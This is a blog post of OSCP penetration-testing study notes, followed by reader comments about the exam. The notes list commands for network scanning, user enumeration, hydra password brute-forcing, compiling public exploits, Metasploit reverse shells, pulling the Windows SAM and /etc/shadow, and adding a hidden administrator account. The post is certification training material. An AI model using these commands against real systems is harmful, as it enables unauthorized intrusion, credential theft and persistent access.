@@ -1,0 +1,654 @@
+OSCP Notes by Ash
+
+Reference Site:  http://security.crudtastic.com/?p=213
+
+
+
+Use Leo and make a new child entry for each IP. Keep ALL information related to testing of that machine in that child entry. Create child entries within the IP entry for each type of scan/information gathering. Create a totally separate child entry for username/password combinations, general notes etc. Leo/good record keeping is what will win the game.
+
+
+
+Scan network for live hosts
+
+(nmap/zenmap)
+
+For NMAP –
+
+
+nmap -vv -sP 192.168.0.1-254 -oG hosts_up.txt
+
+cat hosts_up.txt | grep -i “up”
+
+
+
+
+nmap -PN 192.168.9.200-254
+
+(this will also show open ports for each host)
+
+
+
+
+Identify OS
+
+(nmap/zenmap)
+
+For NMAP –
+
+
+nmap -O 192.168.0.100 (just OS fingerprint)
+
+
+nmap -A 192.168.9.201 (runs an “aggressive” scan – scan,OS fingerprint, version scan, scripts and traceroute)
+
+
+
+
+Check hosts for services
+
+(nmap/zenmap)
+
+For NMAP
+
+- nmap -sS 192.168.9.254 (TCP)
+
+- nmap -sU 192.168.9.254 (UDP)
+
+(Could be better to do this in zenmap and group servers by services)
+
+
+FOR SNMP
+
+-  snmpwalk -c public -v1 192.168.9.254 1 |grep hrSWRunName|cut -d” ” -f
+
+
+For a known port
+
+- nmap – p 139 192.168.9.254
+
+
+
+DNS Lookups/Hostnames
+
+
+host -l <domain> <dns server>
+
+e.g. host -l acme.local 192.168.0.220
+
+
+
+
+Banner grab/Version services
+
+(nmap/zenmap/SNMP)
+
+Check versions of software/services against milw0rm and security focus)
+
+
+For NMAP
+
+- nmap -sV 192.168.9.254
+
+
+
+For SNMP
+
+snmpenum -t 192.168.0.100 (displays all snmp informations for that server)
+
+
+
+For SMTP
+
+nc -v <mailserver> 25
+
+- Will give mailserver version. Can also VRFY to find valid usernames/email accounts
+
+
+
+Netbios/SMB
+
+- smb4k (graphical interface – lists shares)
+
+
+- smbserverscan
+
+
+- metasploit auxiliary scanner
+
+./msfconsole
+
+show
+
+use scanner/smb/version
+
+set RHOSTS 192.168.0.1-192.168.0.254
+
+run
+
+
+
+
+Enumerate Usernames
+
+(SNMP/SMTP/SMB[NETBIOS]/Add others here)
+
+
+For SMB
+
+- nmap -sT -p 445 192.168.9.200-254 -oG smb_results.txt (then grep open sessions)
+
+(on my machine /root/offsec) ./samrdump.py 192.168.9.201 (results from above)
+
+
+For SNMP
+
+- nmap -sT -p 161 192.168.9.200/254 -oG snmp_results.txt (then grep)
+
+- snmpwalk public -v1 192.168.9.201 1 |grep 77.1.2.25 |cut -d” “ -f4
+
+
+For SMTP – (/pentest/enumeration/vrfy)
+
+- ./smtp_VRFY.py <mailserver IP>
+
+** NEED TO MAKE THREADED – VERY SLOW **
+
+
+SAMRDUMP.PY – (/pentest/python/impacket-examples/samrdump.py)
+
+- ./samrdump.py SNMP server
+
+
+*** NAMES.TXT – /pentest/enumeration/vrfy/names.txt ***
+
+*** OR /pentest/web/wfuzz/wordlists/others/names.txt ***
+
+
+
+
+
+Crack Passwords
+
+(hydra/THC bruter)
+
+(need mil-dict.txt from Milw0rm – cracked hashs)
+
+
+FTP – hydra -l <username> -P mil-dic.txt -f <FTP SERVER> ftp -V
+
+
+POP3 – hydra -l <username> -P mil-dict.txt -f <MAIL SERVER> pop3 -V (may need to use -t 15 to limit concurrent connections)
+
+
+SNMP – hydra -P mil-dict.txt -f <SNMP SERVER> -V
+
+
+MS VPN – dos2unix words (whatever word list)
+
+cat words | thc-pptp-bruter VPN server
+
+
+
+Look for known vulnerable services
+
+(refer nmap/zenmap output)
+
+Check versions of software (by either snmp enumeration or nmap/zenmap) against http://www.milw0rm.com/search.php or http://www.securityfocus.com/vulnerabilities or http://www.exploit-db.com
+
+
+
+
+Compile exploit code if possible
+
+(milw0rm archive)
+
+
+cd /pentest/exploits/milw0rm
+
+cat sploitlist.txt | grep -i [exploit]
+
+
+Some exploits may be written for compilation under Windows, while others for Linux.
+
+You can identify the environment by inspecting the headers.
+
+cat exploit | grep “#include”
+
+
+Windows:  process.h, string.h, winbase.h, windows.h, winsock2.h
+
+Linux:   arpa/inet.h, fcntl.h, netdb.h, netinet/in.h, sys/sockt.h, sys/types.h, unistd.h
+
+
+Grep out Windows headers, to leave only Linux based exploits:
+
+cat sploitlist.txt | grep -i exploit | cut -d ” ” -f1 | xargs grep sys | cut -d “:” -f1 | sort -u
+
+
+LINUX
+
+gcc -o dcom 66.c
+
+./dcom
+
+
+
+WINDOWS
+cd /root/.wine/drive_c/MinGW/bin
+wine gcc -o ability.exe ability.c -lwsock32
+wine ability.exe (to run compiled file)
+
+
+
+
+Wireshark Filters
+
+
+To filter out all traffic for IP 192.168.0.100
+
+!(IP.ADDR == 192.168.0.100)
+
+
+
+
+FUZZING STEPS – ASH STYLE
+
+    Determine target application and operating system
+    Obtain a copy of the application
+    Analyse the RFC & communication protocols
+    Discover & record crash conditions
+    Analyse crash conditions for exploitation opportunities
+
+Things we need to know
+
+    Which 4 bytes overwrite EIP
+    Do we have enough space in buffer for shellcode
+    Is this shellcode easily  accessible in memory
+    Does the application filter out any characters
+    Will we encounter overflow protection mechanisms
+
+
+(*** HANDY – framework3/tools -> nasm_shell.rb => JMP ESP ***)
+
+Creating pattern for EIP location
+- framework3/tools -> pattern_create.rb <length> >> Fuzzing_script (will append to the end of the script)
+– then look in ollydbg for pattern (need to reverse it and convert)
+
+- pattern_offset.rb <EIP PATTERN>
+– will show byte offset
+
+Creating shellcode
+(in framework3)
+./msfpayload |grep -i shell
+
+./msfpayload …… o (for options)
+./msfpayload …… c (to create)
+** TAKE NOTE OF SHELLCODE SIZE AND ADJUST FINAL BUFFER TO SUIT **
+
+CAN ALSO USE FRAMEWORK2 MSFWEB INTERFACE (super easy)
+
+
+Finding an exploit
+/pentest/exploits/milw0rm
+grep <exploit> sploitlist.txt
+
+
+MSFCLI (p243)
+./msfcli
+-o options
+-p payloads
+-t test
+-e exploit
+
+MSFCONSOLE
+sessions -l => list created sessions
+sessions -i # => interact with specific session number
+
+show options
+
+search <string>
+
+use exploit/ …..
+set PAYLOAD ….
+
+exploit
+
+
+Meterpreter Payloads (p260)
+payload = windows/meterpreter/reverse_tcp ….
+
+meterpreter> help (lists all commands)
+
+upload <file> c:\\windows
+
+download c:\\windows\\repair\\sam /tmp
+
+ps (running tasks)
+
+execute -f cmd -c (creates a new channel with the cmd shell)
+interact # (interacts with channel)
+
+
+Other useful windows commands
+net user ash my_password /add
+net localgroup administrators ash /add
+
+
+Passwords & Hashes
+Windows SAM => %systemroot%\Repair
+(pwdump or fgdump – p340)
+
+or use framework meterpreter shell => gethashes
+
+Linux => /etc/passwd & /etc/shadow
+
+
+John The Ripper
+for linux => unshadow passwd & shadow file to another file
+
+./john hashes.txt
+
+
+
+Associated Documents
+
+Common Ports – packetlife.net/media/library/23/common-ports.pdf
+Wireshark – http://packetlife.net/media/library/13/Wireshark_Display_Filters.pdf
+TCPDUMP – http://packetlife.net/media/library/12/tcpdump.pdf
+SANS NETCAT – http://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf
+SANS MISC TOOLS – http://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf
+SANS 504 – Cant find
+
+Tags: backtrack, offensive-security, offsec101, oscp, security, Study, training, tutorial
+34 comments
+2 pings
+
+Skip to comment form ↓
+
+    student
+
+    December 24, 2009 at 5:00 pm (UTC 10)
+
+    So did you pass your exam?! I started the course recently and came across your post while google knowledge hunting for OSCP ;-)
+
+    What will you do after OSCP? There is the OSCE but after that the only thing I’ve found is CREST (for professional pen testers in the UK)
+    Chris
+
+    January 29, 2010 at 10:47 pm (UTC 10)
+
+    Hi Ash, I was quite surprised to come across some writings about the OSCP challenge as I was initially looking for something on samrdump for SMB enumeration. Your list of the things for OSCP preparation is pretty close to my prep sheet.
+
+    Unfortunately I failed the challenge. I can definitely agree that this course is very hardcore. I don’t think you can rest on your laurels! Even covering the entire content of the course I have the feeling that I’d still need to have done more outside work to get through that exam.
+
+    I’d be interested in how you got on in any case. I’m currently going back through the course material and I hope to get some more time in the labs pretty soon to get more practice. I don’t think I spent enough time finding and using exploits, and understanding the vulnerabilities within the various OS’s and applications to get me ready for the challenge. Next time I want to make sure I have a few more things up my sleeve.
+
+    Anyway, cheers for the information, I’d be interested in hearing about your experiences of the challenge (without obviously giving too much away)!
+
+    Chris
+    ash
+
+    January 30, 2010 at 8:30 am (UTC 10)
+
+    Hey Chris,
+
+    I eventually passed :) It’s a hard exam!! It took me 2 attempts, and when I eventually passed it all seemed so simple and extremely rewarding!
+
+    I think the key point here to your preparation is to do a lot of work in the labs. You should be able to root all of the lab boxes. Everything that you need to pass the exam (and you should be able to pass it the first time – just make sure to have a break so you don’t go mental like I did) is in the labs there. There is nothing really new, just some pretty cool twists and turns. I know a guy who spent 3 or 4 months in the labs making sure he could get all the machines there.. and he did the exam from start to finish in about 18 hours on his first go.
+
+    But, I do think you are right, preparation is the key! I did a lot more work getting ready for my second attempt and managed to finish it in about 8 hours or so (mind you I knew what to expect this time)
+
+    This isn’t an exam where you can sit down and read a book and hope to regurgitate it and pass (thats a CISSP hahaah)
+
+    Anyway .. Good luck on your resit. I know how you feel, but you do have the upper hand now. Spend the time going over your scans, rebuild the lab scenarios if possible, poke around the labs to see if theres something similar, look in the book, ask in the irc channel .. trust me, things aren’t always as hard as they may seem (but they could be harder)!!
+
+    And in the word of Muts – Try Harder hahahah
+    Chris
+
+    February 1, 2010 at 3:31 am (UTC 10)
+
+    Thanks Ash, and congratulations! I’ll be back in the labs soon no doubt so will take your advice. Nice one, thanks. ;)
+    yaggi
+
+    September 2, 2010 at 2:22 am (UTC 10)
+
+    Im glad you passed. Me, I failed… I think because of the limitations being set like 1 metasploit and no vuln scan.. I belive we can exploit this but their are tools that are not working during the recon like NMAP… Everytime you do the NMAP it says host is not UP even you will use almost all the options (i.e, -PN)
+
+    Also, regarding the 4 machines, the instruction is confusing, it says to gain the root access. I believe the way to get the root of the 4 machines is to get an exploit in the internet and run it against the machine right?
+
+    Hope I can pass in the next round..
+
+    Hope you can share more information my friend.. Its hard to ask help also..I guess your site give at least an encouraging hints
+    ash
+
+    September 2, 2010 at 5:30 am (UTC 10)
+
+    Dont get discouraged :)
+
+    You can definitely nmap the machines .. check the timing (-T)
+
+    Your first machine you have to write an exploit for .. just remember what happened in the class
+
+    The others are the same as machines you should have done at the end of the book … there is nothing new here.
+
+    When I resat the exam I completed it in 3 hours :) Let me know if you need to talk about this more .. good luck .. you can do it!!
+    Yaggi
+
+    September 2, 2010 at 6:50 pm (UTC 10)
+
+    Hi ash,
+
+    Maybe I forgot the timing option, instead, I used unicornscan and netcat scan.. When I get the information like banner, software version, open ports, OS, I feel like stuck since I can’t use more on vuln scanner and metasploit. I was completely stuck and i was not able to gain the confidence again.. I feel sorry that with this information at hand I can’t hack a machine. Although I can go to exploit-db, still the process for me is confusing… I pity myself.
+
+    I really wanted to know how the 4 machines was hack.. Im not sure to take the exam again coz until now I can’t believe I failed.
+    ash
+
+    September 3, 2010 at 9:28 am (UTC 10)
+
+    nah … dont quit!!
+
+    Go back to your book and read up on what you can do. it may not be a single exploit or technique, rather multiple exploits or techniques :)
+
+    If you can do all the exercises in the manual and get the final machines at the end of the manual, you should be fine. If you cant do them, I would suggest getting more lab time, reading the forums, and asking for some help in the IRC channel.
+
+    There’s some awesome people about that will be more than happy to help you (they helped me greatly)
+
+    Feel free to contact me if you need to bounce some ideas around.
+
+    Think about trying to recreate what you scanned int he lab as virtual images so that you can sit at home and practice hacking them as well
+    marco
+
+    September 9, 2010 at 9:06 pm (UTC 10)
+
+    hi ash and yhanks for yours usefull words.
+    I failed the exam, dunno why..ehehe…i do same things you done but i cant get anything. so if u like email me and maybe we can talk about it.
+    thanx
+    ash
+
+    September 10, 2010 at 6:35 am (UTC 10)
+
+    Hi Marco .. don’t get too worried about it .. its a hard exam :)
+
+    How many machines did you get in the exam? Where did you have troubles?
+
+    Keep trying until you pass.. its worth it :)
+    marco
+
+    September 11, 2010 at 4:59 am (UTC 10)
+
+    eheh..ya…really hard…
+    i just exploit..0 machines… :(
+    i got problems with exploitation and so i lose my mind…
+    i think ive learn well and i really understand how works penetration…but…dunno why i just do nothing with the exam…
+    ill try harder…
+    thnx for ur help
+    subtitles
+
+    November 21, 2010 at 11:53 pm (UTC 10)
+
+    Good post
+    sean
+
+    February 19, 2011 at 11:41 pm (UTC 10)
+
+    Hi Ash,
+    I have just taken the exam yesterday, and I think I have failed :0(
+    Not a good feeling when you’ve been up all night also.
+    I will pick myself up and have another go at it after a bit more pwnage in the labs.
+    Just a thought.. Do they give you the same exam again? if so that will sure help.
+    thanks
+    ash
+
+    February 21, 2011 at 6:25 am (UTC 10)
+
+    hahah that exam is brutal!!
+
+    I know how you feel .. You pretty much need to root all of the boxes to pass. Dont let it get to you in any way .. I’m sure you’ll pass it the second time.
+
+    When I retook my exam I got the same challenges .. just different addresses. You can always practice on your own before the resit .. you should have enough information from your recon to be able to find a way to root all the boxes. After I had a good rest from my exam I had a lightbulb moment where everything seemed so much clearer and straight forward .. I ended up rooting all the boxes in next to no time when I sat it the second time.
+
+    Good luck.. You’ll be an OSCP in no time. Post back here and let me know how you go :)
+    Flux
+
+    March 25, 2011 at 7:51 am (UTC 10)
+
+    Hi Ash,
+
+    It seems like allot op OSCP’s have found your post hehe. I’m still in my lab-faze trying harder every day and enjoying myself. I was just wondering a couple of things. Did you use XSS-vulns in the labs (ex: beef), is using msf auxiliary scanners possible during the exam, did you get into the End Goal in the labs?
+
+    greetings
+    Dudley
+
+    April 17, 2012 at 9:48 pm (UTC 10)
+
+    I’m glad to hear you passed Ash. I am studying in labs and was wondering if you have any insight as to restriction of tools on challenge? I heard that you can’t use metasploit and that has be concerned as I us it a good bit especially for pivot attacks….
+    ash
+
+    April 18, 2012 at 6:41 am (UTC 10)
+
+    From when I did the exam you could only use metasploit for one of the boxes. If you have done the course you will know there is more than one way to skin a cat, and metasploit is just an easier automated way of exploit systems. As for pivoting .. theres numerous ways of doing that, and it’s all covered in the courseware :)
+
+    Good luck
+    Dudley
+
+    April 19, 2012 at 12:47 am (UTC 10)
+
+    I’ve got about 19 days left in lab and I must say I don’t feel super comfortable about taking test. I under the premise of all the exercises but have had what I would consider not such good luck in labs. I have gotten a network key and gotten into IT network but only got admin on 6 windows boxes and none of the linux boxes which bothers me. So far none of username/passwords I crack have been resused anywhere which I found odd indeed. I also wanted to know if “http://www.milw0rm.com/search.php” is still up as the site is unreachable and I’ve never been on it before. Any suggestions or helpful hints for lab would be welcome. Thanks
+    Dudley
+
+    April 19, 2012 at 12:54 am (UTC 10)
+
+    I’m also week on building exploits as I’m not a programmer do you have any suggestions on what I can read or do to improve this?
+    Dudley
+
+    April 19, 2012 at 12:55 am (UTC 10)
+
+    LOL I meant “weak” not “week” ………….
+    DrS
+
+    May 4, 2012 at 11:31 pm (UTC 10)
+
+    Dudley, you don’t need to use Milw0rm or other websites as it is all in the exploit-db database on your backtrack machine :
+    By mind, just go to /pentest/exploits/ and make a ‘svn update’ to update the list of public vulnerabilities -they are in sub-folders-.
+
+    I don’t think you need great developer skills, it’s much on knowing the architecture, how a program works in memory, the network, and identify the critical points (memory access -malloc, even printf()-, database access, etc..). 99% of developers, even C developers, have no knowledge on this part which is important : a compiled program doesn’t follow exactly what a developer defines.
+
+    Today the most common exploits vector are injections, such as SQL, XSS or session hijacking. Maybe the actual labs and the exam follow this ‘mainstream’.
+    Dudley
+
+    May 14, 2012 at 9:57 pm (UTC 10)
+
+    So took the test and it kicked my butt. I got the buffer overflow written but struggled big time with other 4 machine. Thing is I’m not sure where to start with preparing for retake. one of the server was running hmailserver which I’m sure must have been vulnerable and the other box were runnin different version of FileZilla beta software but had no luck exploiting them at all LOL. Any helpful hints for preparing for retake would be great. Thanks a bunch
+    ash
+
+    May 15, 2012 at 7:10 pm (UTC 10)
+
+    Well, Hopefully your scans are good enough to tell you what OSes and applications are installed on the machines in the exam. You could possibly rebuild this in your own lab environment now and work out what you need to do to root them.
+
+    That’s where I would start my prep for a resit of the exam.
+
+    I wouldn’t get too disheartened .. its a hard exam. One of my friends just passed it on the weekend .. and he struggled!
+    Dudley
+
+    May 15, 2012 at 8:07 pm (UTC 10)
+
+    I was able to get app version but nmap was not able to get me an exact OS fingerprint :-( like in the case of hmailserver its running on either server 2003 or XP I suspect its server 2003. The filezilla beta are running on some version of freebsd and server 2003. Never messed with freebsd so not sure where to begin with that. I’m pretty all the test machine were running a firewall due to the limited services and ports enumerated on them. Any suggestion would be greatly appreciated. Thanks Ash.
+    Dudley
+
+    May 15, 2012 at 8:10 pm (UTC 10)
+
+    I found this for hmailserver but could never get it to work maybe you could make some suggestions? My only guess is maybe I was doing something wrong when trying to do the exploit. Thanks
+
+    http://www.exploit-db.com/exploits/7012/
+    ash
+
+    May 16, 2012 at 6:59 am (UTC 10)
+
+    Have you done the actual course? There’s practice boxes in the lab for you to attack which are very similar to the machines for the final exam.
+
+    You need to scan all of your hosts, enumerate services, and then look at what vulnerabilities you can exploit. You may not be able to exploit a root vulnerability straight away, you may need to just get shell on the box and then do a local privilege exploit or something.
+
+    Go back to your manual and have a look at the process outlined in there for the best way to crack these boxes. Just because you see something obvious, it doesnt mean that its the answer .. you may find yourself going down a path that wont produce any results.
+    Dudley
+
+    May 16, 2012 at 8:12 pm (UTC 10)
+
+    Yeah I did the course and thing I found was on exam that nmap scan yielded very few open ports. I’m sure the boxes had firewalls. I got one with a buffer overflow and nadda after that one :-( Should I have scanned for other hosts that weren’t being scored possibly?
+    ash
+
+    May 17, 2012 at 6:46 am (UTC 10)
+
+    Did you scan for both TCP and UDP, did you do some SNMP scans .. did you try throttling your nmap scans a bit? Did you version the services on the ports you found?
+
+    You only need to scan the servers that they have provided you .. theres no other systems to go for.
+
+    Did you want to email me your scans so I can see what you have and maybe give you some help?
+    Dudley
+
+    May 17, 2012 at 8:10 pm (UTC 10)
+
+    That would be great if you don’t mind giving me a second opinion. I’m sure I must have missed something.
+    Dudley
+
+    May 18, 2012 at 5:02 am (UTC 10)
+
+    Where should I send my scan results to?
+    Dudley
+
+    May 21, 2012 at 7:09 pm (UTC 10)
+
+    Hey Ash let me know where I can send my scans to to get your opinion. Thanks.
+    marco
+
+    June 22, 2012 at 8:21 am (UTC 10)
+
+    Hi, i wrote some time ago…in these days i thought i never get pwb…fortunatly i was wrong…and i got it.
+    So i can tell to everyone to listen very well this blog, because is very usefull.
+    then think about it, i cannot complete PWB because my minds try to complicate a simple question.
+    think easy….
+    AK
+
+    November 29, 2012 at 6:01 am (UTC 10)
+
+    Hello ASH,
+
+    I too flunked the exam but I made some kills before dieing out , glad you made it through, just a request to you , can we communicate over mails or IRC or IM anyhow?
+    ash
+
+    November 29, 2012 at 7:04 am (UTC 10)
+
+    Sure, feel free to send me an email. My address is easy to find :-)
+
+Leave a Reply
+
+Your email address will not be published. Required fields are marked *
+
+Name: *
+
+Email: *
+
+Website:
+
+Message: *
+
+You may use these HTML tags and attributes:
+<a href="" title=""> <abbr title=""> <acronym title=""> <b> <blockquote cite=""> <cite> <code> <del datetime=""> <em> <i> <q cite=""> <strike> <strong>
